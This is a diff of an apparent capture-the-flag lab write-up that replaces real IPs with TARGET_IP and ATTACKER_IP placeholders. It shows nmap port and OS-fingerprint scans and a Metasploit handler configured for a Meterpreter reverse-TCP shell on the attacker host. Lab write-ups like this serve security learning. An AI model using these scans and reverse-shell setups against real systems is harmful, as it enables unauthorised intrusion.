@@ -20,7 +20,7 @@ $ sudo openvpn --config NovusEdge.ovpn
 
 Performing a quick `nmap` scan gives us some useful details:
 ```shell-session
-$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt 10.10.250.19
+$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt TARGET_IP
 
 PORT     STATE SERVICE       REASON
 80/tcp   open  http          syn-ack ttl 127
@@ -34,7 +34,7 @@ PORT     STATE SERVICE       REASON
 
 OS Fingerprinting for finding a proper attack vector:
 ```shell-session
-$ sudo nmap -O -Pn -vv 10.10.250.19
+$ sudo nmap -O -Pn -vv TARGET_IP
 ...
 ...
 Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
@@ -123,14 +123,14 @@ We'll need a listener on our machine:
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 10.11.5.201
-LHOST => 10.11.5.201
+msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
+LHOST => ATTACKER_IP
 msf6 exploit(multi/handler) > set LPORT PORT
 LPORT => PORT
 
 msf6 exploit(multi/handler) > run
 
-[*] Started reverse TCP handler on 10.11.5.201:PORT
+[*] Started reverse TCP handler on ATTACKER_IP:PORT
 ```
 
 
